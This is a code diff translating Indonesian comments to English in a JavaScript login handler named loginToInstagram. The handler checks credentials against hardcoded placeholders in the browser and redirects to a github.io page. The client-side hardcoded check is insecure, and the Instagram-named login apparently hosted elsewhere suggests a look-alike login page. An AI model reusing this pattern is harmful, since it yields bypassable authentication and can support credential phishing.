@@ -1,24 +1,24 @@
 function handleLogin(event) {
-    event.preventDefault(); // Mencegah form untuk submit dan reload halaman
+    event.preventDefault(); // Prevent the form from submitting and reloading the page
 
-    const username = document.getElementById("username").value; // Mendapatkan nilai username
-    const password = document.getElementById("password").value; // Mendapatkan nilai password
+    const username = document.getElementById("username").value; // Get the username value
+    const password = document.getElementById("password").value; // Get the password value
 
-    // Fungsi loginToInstagram yang akan dipanggil untuk memverifikasi login
+    // Function to verify login credentials
     function loginToInstagram(username, password) {
-        const correctUsername = 'expected_username'; // Username yang benar
-        const correctPassword = 'expected_password'; // Password yang benar
+        const correctUsername = 'expected_username'; // Correct username
+        const correctPassword = 'expected_password'; // Correct password
 
-        // Simulasi login yang berhasil (ganti dengan verifikasi server yang sesungguhnya)
+        // Simulate successful login (replace with actual server verification)
         if (username === correctUsername && password === correctPassword) {
-            // Pengalihan setelah login berhasil
-            window.location.href = "https://trendx122.github.io/pass/"; // Ganti dengan URL yang sesuai
+            // Redirect after successful login
+            window.location.href = "https://trendx122.github.io/pass/"; // Replace with appropriate URL
         } else {
-            // Tampilkan pesan kesalahan jika username atau password salah
-            alert("Username atau password salah. Coba lagi.");
+            // Display error message if username or password is incorrect
+            alert("Incorrect username or password. Please try again.");
         }
     }
 
-    // Panggil fungsi loginToInstagram untuk memverifikasi username dan password
+    // Call the function to verify username and password
     loginToInstagram(username, password);
 }
